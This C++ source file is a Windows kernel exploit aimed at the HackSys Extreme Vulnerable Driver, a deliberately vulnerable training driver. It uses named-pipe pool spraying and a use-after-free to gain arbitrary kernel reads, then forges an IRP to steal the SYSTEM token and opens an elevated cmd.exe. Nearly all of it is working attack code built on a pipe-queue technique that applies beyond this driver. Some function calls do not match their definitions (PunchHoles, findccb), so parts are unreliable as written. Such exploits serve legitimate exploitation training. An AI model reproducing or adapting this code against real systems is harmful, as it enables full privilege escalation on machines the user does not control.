#include <Windows.h>
#include <winternl.h>
#include <Psapi.h>
//#include <sysinfoapi.h>

#pragma warning(disable:4996) 
#include <sphelper.h>
#pragma warning(default: 4996)

#include <iostream>

//NTSTATUS Codes Defined
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)

//Define IO_COMPLETION_OBJECT
#define IO_COMPLETION_OBJECT 1

//Define IOCTLS
#define IOCTL_ALLOC_NX 0x222053
#define IOCTL_FREE_NX 0x22205B
#define IOCTL_ALLOC_FAKE_OBJ_NX 0x22205F
#define IOCTL_USE_FAKE_OBJ_NX 0x222057

//Maximum File Length
#define MAXIMUM_FILENAME_LENGTH 255 

//Fake Object Size
#define FAKE_OBJECT_SIZE 60

//IRP constants
#define IRP_BUFFERED_IO                 0x00000010
#define IRP_DEALLOCATE_BUFFER           0x00000020
#define IRP_INPUT_OPERATION             0x00000040

#define EPROCESS_OFFSET 0x2c8 //0x430

typedef struct {
	HANDLE Read;
	HANDLE Write;
} PIPE_HANDLES;


PIPE_HANDLES PipeArrayB[10000];//PipeArrayA_2

PIPE_HANDLES PipeArrayB_2[10000];



#define POOL_HEADER_SIZE 0x10
#define NP_HEADER_SIZE 0x30
#define FIRST_ENTRY_SIZE (0x2000-NP_HEADER_SIZE) //FIRST_ENTRY is not very important
#define SECOND_ENTRY_SIZE (0x4000-NP_HEADER_SIZE)
#define THIRD_ENTRY_SIZE (0x1000-NP_HEADER_SIZE)
#define ARBITRARY_WRITE_SIZE 8
#define LEAKED_DATA_OFFSET 0xa8

#define USER_DATA_ENTRY_ADDR ((long long)THIRD_ENTRY_SIZE<<32)

#define FAKE_OBJ_SIZE 0x58
#define DATA_ENTRY_SIZE 0x60

#define DATA_ENTRY (FAKE_OBJ_SIZE - NP_HEADER_SIZE)


#define PID_OFFSET 0x440
#define ACTIVELINKS_OFFSET 0x448
#define EPROCESS_TOKEN_OFFSET 0x4b8


typedef void (IO_APC_ROUTINE)(
	void* ApcContext,
	IO_STATUS_BLOCK* IoStatusBlock,
	unsigned long    reserved
	);

typedef int(__stdcall* NTFSCONTROLFILE)(
	HANDLE           fileHandle,
	HANDLE           event,
	IO_APC_ROUTINE* apcRoutine,
	void* ApcContext,
	IO_STATUS_BLOCK* ioStatusBlock,
	unsigned long    FsControlCode,
	void* InputBuffer,
	unsigned long    InputBufferLength,
	void* OutputBuffer,
	unsigned long    OutputBufferLength
	);

PIPE_HANDLES PIPEhandles = {};

typedef struct {
	SHORT Type;
	USHORT Size;
	PVOID MdlAddress;
	ULONG Flags;
	PVOID AssociatedIrp;
	LIST_ENTRY ThreadListEntry;
	IO_STATUS_BLOCK IoStatus;
	CHAR RequestorMode;
	BOOLEAN PendingReturned;
	CHAR StackCount;
	CHAR CurrentLocation;
	BOOLEAN Cancel;
	UCHAR CancelIrql;
	CCHAR ApcEnvironment;
	UCHAR AllocationFlags;
	PVOID UserIosb;
	PVOID UserEvent;
	char Overlay[16];
	PVOID CancelRoutine;
	PVOID UserBuffer;
	CHAR TailIsWrong;
} IRP;

typedef struct {
	uint64_t Flink;
	uint64_t Blink;
	IRP* Irp;
	uint64_t SecurityContext;
	uint32_t EntryType;
	uint32_t QuotaInEntry;
	uint32_t DataSize;
	uint32_t x;
} DATA_QUEUE_ENTRY;


HANDLE hevd;


DWORD _GetVersion()
{
	DWORD dwVersion = 0;
	DWORD dwMajorVersion = 0;
	DWORD dwMinorVersion = 0;
	DWORD dwBuild = 0;

	dwVersion = GetVersion();

	// Get the Windows version.

	dwMajorVersion = (DWORD)(LOBYTE(LOWORD(dwVersion)));
	dwMinorVersion = (DWORD)(HIBYTE(LOWORD(dwVersion)));

	// Get the build number.

	if (dwVersion < 0x80000000)
		dwBuild = (DWORD)(HIWORD(dwVersion));

	printf("Version is %d.%d (%d)\n",
		dwMajorVersion,
		dwMinorVersion,
		dwBuild);

	return dwVersion;
}


void SprayNonPagedNXPool() {

	BOOL res = 0;


	UCHAR payload[DATA_ENTRY]; //0x60 blocks
	memset(payload, 0x43, DATA_ENTRY);

	UINT i = 0;
	DWORD resultLength = 0;


	printf("[+] Spray 10,000 DATA_QUEUE_ENTRY objects in Non-Paged Pool\n");
	for (i = 0; i < 10000; i++) {

		PipeArrayB[i].Write = CreateNamedPipe(
			L"\\\\.\\pipe\\exploit_HEVD_UAF2",
			PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED,
			PIPE_TYPE_BYTE | PIPE_WAIT,
			PIPE_UNLIMITED_INSTANCES,
			DATA_ENTRY,
			DATA_ENTRY,
			0,
			0);
		PipeArrayB[i].Read = CreateFile(L"\\\\.\\pipe\\exploit_HEVD_UAF2", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0);


		res = WriteFile(PipeArrayB[i].Write, payload, DATA_ENTRY, &resultLength, NULL); //Allocate 0x60 bytes en NpFr POOL

		if (!res)
		{
			printf("[-] Failed to writeFile payloadMid %d", GetLastError());
			return;
		}

	}
}

void SprayNonPagedNXPool2() {

	BOOL res = 0;

	UCHAR payload[DATA_ENTRY]; //0x60 blocks
	memset(payload, 0x53, DATA_ENTRY);

	UINT i = 0;
	DWORD resultLength = 0;


	printf("[+] Sprayed 10,000 DATA_QUEUE_ENTRY objects in Non-Paged Pool\n");
	for (i = 0; i < 10000; i++) {

		PipeArrayB_2[i].Write = CreateNamedPipe(
			L"\\\\.\\pipe\\exploit_HEVD_UAF2",
			PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED,
			PIPE_TYPE_BYTE | PIPE_WAIT,
			PIPE_UNLIMITED_INSTANCES,
			DATA_ENTRY,
			DATA_ENTRY,
			0,
			0);
		PipeArrayB_2[i].Read = CreateFile(L"\\\\.\\pipe\\exploit_HEVD_UAF2", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0);

		res = WriteFile(PipeArrayB_2[i].Write, payload, DATA_ENTRY, &resultLength, NULL); //Allocate 0x60 bytes en NpFr POOL

		if (!res)
		{
			printf("[-] Failed to writeFile payloadLeft %d", GetLastError());
			return;
		}



	}
}


//this routine go through all the pipe handlers and read their content using PeekNamedPipe. 
//If the content match with the magic bytes, then we have found the corrupted DATA_QUEUE_ENTRY
PIPE_HANDLES DetectPipe()
{
	BOOL res = 0;
	UCHAR payload[DATA_ENTRY]; //0x60 blocks
	memset(payload, 0x44, sizeof(payload));
	DWORD resultLength = 0;
	DWORD magic = 0x45464748;
	DWORD extract = 0x0;

	for (int i = 0; i < 10000; i++) //iterate through all the
	{

		res = PeekNamedPipe(PipeArrayB_2[i].Read, payload, DATA_ENTRY, &resultLength, 0, 0);

		extract = *(DWORD*)(payload);
		if (extract == magic)
		{
			printf("[+] Corrupted DATA_QUEUE_ENTRY found!\n");
			return PipeArrayB_2[i];
		}

		if (!res)
		{
			printf("[-] error reading in pipe\n");
			return { 0 };
		}
	}
	printf("[+] Find corrupted PIPE\n");
}

//try to free two consecutive holes in the POOL
void CreateHoles() {

	UINT i = 0;

	DWORD readBytes = 0;


	for (i = 0; i < 10000; i+=4) {
		if (!CloseHandle(PipeArrayB[i].Read) && !CloseHandle(PipeArrayB[i].Write)) {
			printf("Failed to Close Handle of Objects in readPipeArrayB and writePipeArrayB: 0x%X\n", GetLastError());
			return;
		}

	}
	printf("[+] Close handles to make holes in Non-Paged Pool\n");
}


void SprayNonPagedPool(LPVOID fakeEntry)
{
	BOOL res = 0;
	DWORD BytesReturned = 0;

	printf("[+] Spraying fake objects\n");

	for (int i = 0; i < 5000; i++)
	{
		res = DeviceIoControl(hevd, IOCTL_ALLOC_FAKE_OBJ_NX, fakeEntry, sizeof(fakeEntry), NULL, 0, &BytesReturned, NULL);

		if (!res)
		{
			DWORD err = GetLastError();
			printf("[+] DeviceIoControl, error: %p\n", err);
		}
	}
}



void PrepareDataEntryForRead(DATA_QUEUE_ENTRY* dqe, IRP* irp, uint64_t read_address) {
	memset(dqe, 0, sizeof(DATA_QUEUE_ENTRY));
	dqe->EntryType = 1;
	dqe->DataSize = -1;
	dqe->Irp = irp;
	irp->AssociatedIrp = (PVOID)read_address;
}

void PrepareDataEntryForWrite(DATA_QUEUE_ENTRY* dqe, IRP* irp, uint32_t size) {
	dqe = (DATA_QUEUE_ENTRY*)USER_DATA_ENTRY_ADDR;
	memset(dqe, 0, sizeof(DATA_QUEUE_ENTRY));
	dqe->Flink = (uint64_t)dqe;
	dqe->EntryType = 0;
	dqe->DataSize = size;
	dqe->Irp = irp;
}


void LeakMem(HANDLE victimPIPE, uint64_t addr, size_t len, char* data) {
	static char* buf = (char*)malloc(len + 0x1 + LEAKED_DATA_OFFSET);
	DATA_QUEUE_ENTRY* dqe = (DATA_QUEUE_ENTRY*)USER_DATA_ENTRY_ADDR;
	DWORD read;

	IRP* irp = (IRP*)(USER_DATA_ENTRY_ADDR + 0x1000);
	memset(dqe, 0, sizeof(DATA_QUEUE_ENTRY));
	dqe->EntryType = 1;
	dqe->DataSize = -1;
	dqe->Irp = irp;
	irp->AssociatedIrp = (PVOID)addr;

	PeekNamedPipe(victimPIPE, buf, len + LEAKED_DATA_OFFSET, &read, 0, 0);
	memcpy(data, buf, len + LEAKED_DATA_OFFSET);
	memset(buf, 0x00, len + LEAKED_DATA_OFFSET); //init
}

void BuildFakeIRP(IRP* irp, PVOID thread_list, PVOID source_address, PVOID destination_address) {
	irp->Flags = 0x60850;
	irp->AssociatedIrp = source_address;
	irp->UserBuffer = destination_address;
	irp->ThreadListEntry.Flink = (LIST_ENTRY*)(thread_list);
	irp->ThreadListEntry.Blink = (LIST_ENTRY*)(thread_list);
}

void findIrpAddres(uint64_t* IrpAddr, uint64_t ccbAddr, uint64_t previousIRP)
{
	char data[0x1000];
	memset(data, 0x0, 0x1000);
	bool IrpFOund = false;
	uint64_t ccbAddrTmp = 0;
	uint64_t NextCcb = 0;
	ccbAddrTmp = ccbAddr + 0x18; //flink = ccbAddr + 0x18; blink = ccbAddr + 0x20
	uint32_t iter = 0;

	while (!IrpFOund)
	{
		iter++;
		LeakMem(PIPEhandles.Read, ccbAddrTmp, 0x8, data); //extract the next CCB address (Flink of LIST_ENTRY)
		NextCcb = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
		LeakMem(PIPEhandles.Read, NextCcb - 0x18 + 0xe8, 0x8, data); //extract DATA_QUEUE_ENTRY pointer in the CCB object
		*IrpAddr = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
		if (*IrpAddr != NULL && *IrpAddr != previousIRP) //if the DATA_QUEUE_ENTRY pointed by the CCB object is the previously calculated overwritten DATA_QUEUE_ENTRY chunk address, we found the CCB related to the overwritten DATA_QUEUE_ENTRY
		{
			IrpFOund = true;
		}

		ccbAddrTmp = NextCcb;

		if (iter > 500000)
			break;

	}
}

void findCCB(uint64_t* overwrittenQueueDataEntryCCB, uint64_t ccbAddr, uint64_t current_chunk_addr)
{
	char data[0x1000];
	memset(data, 0x0, 0x1000);
	bool CcbFound = false;
	uint64_t ccbAddrTmp = 0;
	uint64_t NextCcb = 0;
	uint64_t ccbAddrDataEntryPtr = 0;
	ccbAddrTmp = ccbAddr + 0x18; //flink = ccbAddr + 0x18; blink = ccbAddr + 0x20
	int iter = 0;

	while (!CcbFound)
	{
		iter++;
		LeakMem(PIPEhandles.Read, ccbAddrTmp, 0x8, data); //extract the next CCB address (Flink of LIST_ENTRY)
		NextCcb = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
		LeakMem(PIPEhandles.Read, NextCcb + 0x90, 0x8, data); //extract DATA_QUEUE_ENTRY pointer in the CCB object
		ccbAddrDataEntryPtr = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
		if (ccbAddrDataEntryPtr == current_chunk_addr) //if the DATA_QUEUE_ENTRY pointed by the CCB object is the previously calculated overwritten DATA_QUEUE_ENTRY chunk address, we found the CCB related to the overwritten DATA_QUEUE_ENTRY
		{
			CcbFound = true;
			*overwrittenQueueDataEntryCCB = NextCcb;
		}

		ccbAddrTmp = NextCcb;

		if (iter > 500000)
			break;

	}
}

void foundIrpInDataEntry(uint64_t* IrpAddr, uint64_t ccbAddr, uint64_t previousIRP)
{
	char data[0x1000];
	memset(data, 0x0, 0x1000);
	bool CcbFound = false;
	uint64_t ccbAddrTmp = 0;
	uint64_t NextCcb = 0;
	uint64_t ccbAddrDataEntryPtr = 0;
	ccbAddrTmp = ccbAddr + 0x18; //flink = ccbAddr + 0x18; blink = ccbAddr + 0x20
	int iter = 0;

	while (!CcbFound)
	{
		iter++;
		LeakMem(PIPEhandles.Read, ccbAddrTmp, 0x8, data); //extract the next CCB address (Flink of LIST_ENTRY)
		NextCcb = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
		LeakMem(PIPEhandles.Read, NextCcb + 0x90, 0x8, data); //extract first DATA_QUEUE_ENTRY pointer in the CCB object
		ccbAddrDataEntryPtr = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
		LeakMem(PIPEhandles.Read, ccbAddrDataEntryPtr + 0x10, 0x8, data); //extract IRP related offset of DATA_QUEUE_ENTRY object
		*IrpAddr = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
		if (*IrpAddr != NULL && *IrpAddr != previousIRP && *IrpAddr>0x7fffffff)
		{
			CcbFound = true;
		}

		LeakMem(PIPEhandles.Read, NextCcb + 0x98, 0x8, data); //extract second DATA_QUEUE_ENTRY pointer in the CCB object
		ccbAddrDataEntryPtr = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
		LeakMem(PIPEhandles.Read, ccbAddrDataEntryPtr + 0x10, 0x8, data); //extract IRP related offset of DATA_QUEUE_ENTRY object
		*IrpAddr = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
		if (*IrpAddr != NULL && *IrpAddr != previousIRP && *IrpAddr > 0x7fffffff)
		{
			CcbFound = true;
		}
		ccbAddrTmp = NextCcb;

		if (iter > 500000)
			break;

	}
}


uint64_t GetProcessById(HANDLE handle, uint64_t first_process, uint64_t pid) {
	uint64_t current_pid = 0;
	uint64_t current_process = first_process;
	char data[0x1000];
	memset(data, 0x0, 0x1000);
	while (1) {
		LeakMem(PIPEhandles.Read, (uint64_t)current_process + PID_OFFSET, 0x8, data);
		current_pid = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
		if (current_pid == pid)
			return current_process;

		LeakMem(PIPEhandles.Read, (uint64_t)current_process + ACTIVELINKS_OFFSET, 0x8, data);
		current_process = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
		current_process -= PID_OFFSET + 0x8;

		if (current_process == first_process)
			return 0;
	}
}


int main()
{
	DWORD version = _GetVersion();


	if (version != 0x23f00206) //Windows 10 21h2 19044.1586
	{
		printf("exploit not supported for this Windows OS. Yo need to adjust ROP gadgets and maybe the shellcode\n");
		system("pause");
		return -1;
	}

	hevd = CreateFileA(
		"\\\\.\\HackSysExtremeVulnerableDriver",
		0xC0000000,
		0,
		NULL,
		0x3,
		0,
		NULL);

	if (hevd == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to open", GetLastError());
		return -1;
	}
	else
	{
		printf("[+] Valid handle opened\n");
	}


	LPVOID DataEntrySpray = VirtualAlloc(
		NULL,				// Next page to commit
		FAKE_OBJ_SIZE,		        // Page size, in bytes
		MEM_COMMIT | MEM_RESERVE,	// Allocate a committed page
		PAGE_EXECUTE_READWRITE);	// Read/write access

	if (DataEntrySpray == NULL) {
		printf("[-] Unable to reserve memory for shellcode!\n");
		return -1;
	}


	BYTE InputBuffer[FAKE_OBJ_SIZE];
	memset(InputBuffer, 0x00, sizeof(InputBuffer));

	//allocate Flink Space - this address is used to perform the first arbitrary read and leak the next chunk. 
	if (VirtualAlloc((PVOID)USER_DATA_ENTRY_ADDR, 0x5000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != (PVOID)USER_DATA_ENTRY_ADDR) {
		printf("Couldn't allocate base address %p\n", USER_DATA_ENTRY_ADDR);
		return 0;
	}

	PVOID UserAddr = VirtualAlloc(NULL, 0x5000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (UserAddr)
	{
		memset(UserAddr, 0x52, 0x5000);
	}

	uint64_t read_address = 0;

	//build a Unbuffured DATA_QUEUE_ENTRY object placed in userland (USER_DATA_ENTRY_ADDR) to perform the arbitrary read.

	DATA_QUEUE_ENTRY UnbufferedDqe = { 0 };

	UnbufferedDqe.EntryType = 1;
	UnbufferedDqe.DataSize = -1;
	IRP irp = { 0 };
	UnbufferedDqe.Irp = &irp; //unbuffered DATA_QUEUE_ENTRY uses IRP to extend the storage capability
	irp.AssociatedIrp = (PVOID)read_address;  //this is the addressthat is used in te arbitrary read

	memcpy((PVOID)USER_DATA_ENTRY_ADDR, &UnbufferedDqe, sizeof(DATA_QUEUE_ENTRY));

	DATA_QUEUE_ENTRY dqe = { 0 };

	dqe.Flink = USER_DATA_ENTRY_ADDR;
	dqe.Blink = USER_DATA_ENTRY_ADDR;
	dqe.EntryType = 0x0; //NO IRP
	dqe.DataSize = sizeof(DATA_QUEUE_ENTRY) + FAKE_OBJ_SIZE + 0x20;

	memcpy(InputBuffer, &dqe, sizeof(DATA_QUEUE_ENTRY));
	*(ULONGLONG*)(InputBuffer + 0x30) = (ULONGLONG)((ULONGLONG)0x4142434445464748); //magic sequence = 0x4142434445464748
	*(ULONGLONG*)(InputBuffer + 0x38) = (ULONGLONG)((ULONGLONG)0x4142434445464748);
	*(ULONGLONG*)(InputBuffer + 0x40) = (ULONGLONG)((ULONGLONG)0x4142434445464748);
	*(ULONGLONG*)(InputBuffer + 0x48) = (ULONGLONG)((ULONGLONG)0x4142434445464748);
	*(ULONGLONG*)(InputBuffer + 0x50) = (ULONGLONG)((ULONGLONG)0x4142434445464748);
	memcpy(DataEntrySpray, InputBuffer, 0x58);

	bool res = 0;
	DWORD BytesReturned = 0;
	
	//Massage the POOL with DATA_QUEUE_ENTRY objects
	SprayNonPagedNXPool();
	PunchHoles();//Free objects in the pool so the next object of 0x60 size will be allocated in one of this holes

	//allocate HEVD object
	printf("[+] Allocate HEVD object\n");
	DeviceIoControl(hevd, IOCTL_ALLOC_NX, NULL, 0, NULL, 0, &BytesReturned, NULL);
	printf("[+] Free HEVD object\n");
	//free  HEVD object
	DeviceIoControl(hevd, IOCTL_FREE_NX, NULL, 0, NULL, 0, &BytesReturned, NULL);

	//SprayNonPagedNXPool();

	//spray with DATA_QUEUE_ENTRY objects in order to fill the hole previously freed with the freed HEVD object
	SprayNonPagedNXPool2();

	//Now, the HEVD object pool space should be filled with a DATA_QUEUE_ENTRY object
	printf("[+] Free HEVD object again\n");
	DeviceIoControl(hevd, IOCTL_FREE_NX, NULL, 0, NULL, 0, &BytesReturned, NULL); //Free NpFr DATA_QUEUE_ENTRY

	//DeviceCall
	
	//Spray with fake HEVD objects in order to place a fake DATA_QUEUE_ENTRY in the previously freed hole
	printf("[+] Reclaim HEVD object hole spraying DATA_QUEUE_ENTRY\n");
	SprayNonPagedPool(DataEntrySpray); //Reclaim NpFr DATA_ENTRY



	PIPEhandles = DetectPipe(); //this routine look for the fake DATA_QUEUE_ENTRY trying to match the magic bytes (045464748) in each iteration

	if (!PIPEhandles.Read)
	{
		printf("pipe not found, the system will crash after process termination");
		return -1;
	}

	char data[0x1000];
	LeakMem(PIPEhandles.Read, (uint64_t)UserAddr, 0xF58, data);
	//cleanUp
	DWORD zero = 0;
	uint64_t cleanUpEntryTipe = USER_DATA_ENTRY_ADDR + 0x20;
	memcpy((PVOID)(USER_DATA_ENTRY_ADDR + 0x20), &zero, sizeof(zero));

	DATA_QUEUE_ENTRY* next_chunk_flink = (DATA_QUEUE_ENTRY*)*(ULONGLONG*)(data + 0x40);
	printf("[+] Leaked Flink of next chunk: %p\n", next_chunk_flink);

	//extract next_chunk_flink content
	LeakMem(PIPEhandles.Read, (uint64_t)&next_chunk_flink->Blink, 8, data);
	uint64_t next_chunk_addr = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);

	printf("[+] Address of next chunk: %p\n", next_chunk_addr);

	uint64_t current_chunk_addr = next_chunk_addr - DATA_ENTRY_SIZE - POOL_HEADER_SIZE;

	printf("[+] Address of current chunk: %p\n", current_chunk_addr);

	uint64_t ccbAddr = (uint64_t)next_chunk_flink - 0xa8;

	printf("[+] Address of CCB: %p\n", ccbAddr);

	/*LeakMem(PIPEhandles.Read, ccbAddr + 0x30, 0x10, data);
	uint64_t File_object1 = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
	uint64_t File_object2 = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET + 0x8);

	printf("[+] Address of File_object1 in next chunk CCB: %p\n", File_object1);
	printf("[+] Address of File_object2 in next chunk CCB: %p\n", File_object2);*/

	uint64_t current_chunk_flink = 0;
	uint64_t current_chunk_blink = 0;
	uint64_t PotentialBlink = 0;
	uint64_t flink = (uint64_t)next_chunk_flink;


	//try to recover the overwritten flink and blink in DATA_QUEUE_ENTRY object. Without this the kernel crash because the corrupted entry in LIST_ENTRY
	//For this, we need to follow the LIST_ENTRY of the CCB object and inspect the content. If the CCB+0xa8 content = current_chunk_address, we have the corrupted CCB
	//and we can recover  the overwritten flink and blink of the lost DATA_QUEUE_ENTRY

	uint64_t overwrittenQueueDataEntryCCB = 0;
	findccb(&overwrittenQueueDataEntryCCB, ccbAddr,  current_chunk_addr);
	printf("[+] Address of overwritten CCB: %p\n", overwrittenQueueDataEntryCCB);
	
	//leak current CCB chunk FILE OBJECTS
	/*LeakMem(PIPEhandles.Read, overwrittenQueueDataEntryCCB - 0x18 + 0x30, 0x10, data);
	uint64_t File_object_CurrentChunk = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
	uint64_t File_object2_CurrentChunk = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET + 0x8);

	printf("[+] Address of File_object_CurrentChunk in current chunk CCB: %p\n", File_object_CurrentChunk);
	printf("[+] Address of File_object2_CurrentChunk in current chunk CCB: %p\n", File_object2_CurrentChunk);*/

	BYTE readBuf[DATA_ENTRY + 8];
	DWORD numBytes = 0;
	NTFSCONTROLFILE NtFsControlFile = (NTFSCONTROLFILE)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtFsControlFile");
	IO_STATUS_BLOCK isb;
	char irp_data[0x1000];
	memset(irp_data, 0x77, 0x1000);

	PIPE_HANDLES pipeHandle2{ 0 };

	//Create an unbuffered QUEUE DAYA ENTRY with an IRP pointer that is copied with the CCB structure related to the connection created in NtFsControlFile 0x119ff8 call
	//this happens in NpAddDataQueueEntry
	pipeHandle2.Write = CreateNamedPipe(
		L"\\\\.\\pipe\\exploit_HEVD_UAF2",
		PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED,
		PIPE_TYPE_BYTE | PIPE_WAIT,
		PIPE_UNLIMITED_INSTANCES,
		DATA_ENTRY,
		DATA_ENTRY,
		0,
		0);
	pipeHandle2.Read = CreateFile(L"\\\\.\\pipe\\exploit_HEVD_UAF2", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0);

	//Create unbufferentru
	NtFsControlFile(pipeHandle2.Write, 0, 0, 0, &isb, 0x119FF8, irp_data, DATA_ENTRY_SIZE, 0, 0);


	//now i used the same method used to recover the overwritten flink and blink of the original DATA QUEUE ENTRY.
	//this time i iterate through all the CCB LIST_ENTRY until i found the CCB created in the previous call (offset 0xe8 should not be NULL)

	
	uint64_t IrpAddr = 0;
	findIrpAddres(&IrpAddr, ccbAddr, NULL);
	printf("[+] IRP found! Address of IRP: %p\n", IrpAddr);

	//Now i read all the IRP structure content
	char irp_leaked_data[sizeof(IRP)+0x200];
	LeakMem(PIPEhandles.Read, IrpAddr, sizeof(IRP)+0x200, data);
	memcpy(irp_leaked_data, (uint64_t*)(data + LEAKED_DATA_OFFSET), sizeof(IRP)+0x200);
	IRP* irp_object = (IRP*)irp_leaked_data;


	//leak eprocess data

	//Read ThreadListHead pointer from IRP->ThreadListEntry.Flink+0x38
	uint64_t thread_list_head = 0;
	uint64_t current_process = 0;
	uint64_t system_process = 0;
	uint64_t current_process_id = 0;
	uint64_t system_token = 0;
	LeakMem(PIPEhandles.Read, (uint64_t)irp_object->ThreadListEntry.Flink+0x38, 0x8, data);
	thread_list_head = (uint64_t)* (uint64_t*)(data + LEAKED_DATA_OFFSET);
	printf("[+] thread_list_head address: %p\n", thread_list_head);

	//extract current process locate in cp_thread_list_head-0x2c8
	LeakMem(PIPEhandles.Read, (uint64_t)thread_list_head - EPROCESS_OFFSET, 0x8, data);
	current_process = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
	printf("[+] current_process address: %p\n", current_process);

	LeakMem(PIPEhandles.Read, (uint64_t)current_process+ PID_OFFSET, 0x8, data);
	current_process_id = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
	printf("[+] PID found: %p\n", current_process_id);

	if (current_process_id != GetCurrentProcessId())
	{
		printf("[-] Not valid PID found");
	}

	//find SYSTEM process
	system_process = GetProcessById(PIPEhandles.Read,current_process, 4);
	printf("[+] system_process address: %p\n", system_process);


	//Extract system token - EPROCESS_TOKEN_OFFSET
	//Prepare IRP
	BYTE sourceAddr[0x20];
	memset(sourceAddr, 0x81, 0x20);

	uint64_t thread_list[2];
	BuildFakeIRP(irp_object, thread_list, (PVOID)(system_process + EPROCESS_TOKEN_OFFSET), (PVOID)(current_process + EPROCESS_TOKEN_OFFSET));

	//allocate forged IRP in unbuffered data entry

	PIPE_HANDLES pipeHandle3{ 0 };

	//Create an unbuffered QUEUE DAYA ENTRY with an IRP pointer that is copied with the CCB structure related to the connection created in NtFsControlFile 0x119ff8 call
	//this happens in NpAddDataQueueEntry
	pipeHandle3.Write = CreateNamedPipe(
		L"\\\\.\\pipe\\exploit_HEVD_UAF2",
		PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED,
		PIPE_TYPE_BYTE | PIPE_WAIT,
		PIPE_UNLIMITED_INSTANCES,
		DATA_ENTRY,
		DATA_ENTRY,
		0,
		0);
	pipeHandle3.Read = CreateFile(L"\\\\.\\pipe\\exploit_HEVD_UAF2", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0);

	//Create unbufferentry
	NtFsControlFile(pipeHandle3.Write, 0, 0, 0, &isb, 0x119FF8, irp_object, sizeof(IRP) + 0x200, 0, 0);

	uint64_t FakeIrpAddr = 0;
	//search kernel address of IRP created during NtFsControlFile 0x119FF8 call
	foundIrpInDataEntry(&FakeIrpAddr, ccbAddr, IrpAddr);
 	printf("[+] IRP found! Address of IRP: %p\n", FakeIrpAddr);

	uint64_t IrpSystemAddr = 0;
	LeakMem(PIPEhandles.Read, FakeIrpAddr+0x18, 0x8, data); //extract SystemAddress from IRP
	//systemAdress points to irp_object injected in NtFsControlFile
	IrpSystemAddr = (uint64_t) * (uint64_t*)(data + LEAKED_DATA_OFFSET);
	printf("[+] Address of IrpSystemAddr: %p\n", IrpSystemAddr);

	//PrepareDataEntryForWrite(&dqe, (IRP*)IrpSystemAddr, ARBITRARY_WRITE_SIZE);
	thread_list[0] = thread_list[1] = IrpSystemAddr + offsetof(IRP, ThreadListEntry.Flink);
	
	printf("[+] Triggering a call to IofCompleteRequest with our forged IRP and overwriting our token\n\n");


	//Prepare DATA QUEUE ENTRY with lost data to avoid LIST_ENTRY KeBugCheck
	dqe = { 0 };

	//dqe.Flink = (uint64_t)dqe;
	dqe.Flink = overwrittenQueueDataEntryCCB + 0x90; //0x90 offset between the beginning of CCB chunk in nonpagedpool and DATA_QUEUE_ENTRY pointer in CCB object.
	dqe.Blink = overwrittenQueueDataEntryCCB + 0x90;
	dqe.Irp = (IRP*)IrpSystemAddr;
	dqe.SecurityContext = 0;//File_object1 - 0xa0; //0xa0 offset between the object pointer and the beginning of the FILE chunk in nonpagedpool
	dqe.EntryType = 0x0; //NO IRP  NextCcb+0xd8
	dqe.DataSize = 0x28;
	dqe.QuotaInEntry = 0x8;

	memcpy(InputBuffer, &dqe, sizeof(DATA_QUEUE_ENTRY));
	*(ULONGLONG*)(InputBuffer + 0x30) = (ULONGLONG)((ULONGLONG)0x4942434445464749);
	*(ULONGLONG*)(InputBuffer + 0x38) = (ULONGLONG)((ULONGLONG)0x4942434445464749);
	*(ULONGLONG*)(InputBuffer + 0x40) = (ULONGLONG)((ULONGLONG)0x4942434445464749);
	*(ULONGLONG*)(InputBuffer + 0x48) = (ULONGLONG)((ULONGLONG)0x4942434445464749);
	*(ULONGLONG*)(InputBuffer + 0x50) = (ULONGLONG)((ULONGLONG)0x4942434445464749);
	memcpy(DataEntrySpray, InputBuffer, 0x58);

	DeviceIoControl(hevd, IOCTL_FREE_NX, NULL, 0, NULL, 0, &BytesReturned, NULL); //Free NpFr DATA_QUEUE_ENTRY After leak

	//prepare a crafter DATA_QUEUE_ENTRY with the lost flink and blink when original DATA QUEUE ENTRY was reclaimed with a fake object to avoid bugcheck
	SprayNonPagedPool(DataEntrySpray); //Reclaim NpFr DATA_QUEUE_ENTRY

	//at this point the previously corrupted DATA_QUEUE_ENTRY has been fixed to pass LIST_ENTRY security check and the SecurityContext of this object is pointing to a FILE object in the nonpaged pool

	//perform a read operation in order to free the DATA_QUEUE_ENTRY. this happends in NpFreeClientSecurityContext
	
	BYTE bufRead[0x80];
	ReadFile(PIPEhandles.Read, bufRead, 8, &BytesReturned, 0);
	ReadFile(PIPEhandles.Read, bufRead, 0x20, &BytesReturned, 0);

	Sleep(2000);

	system("cmd.exe");

}

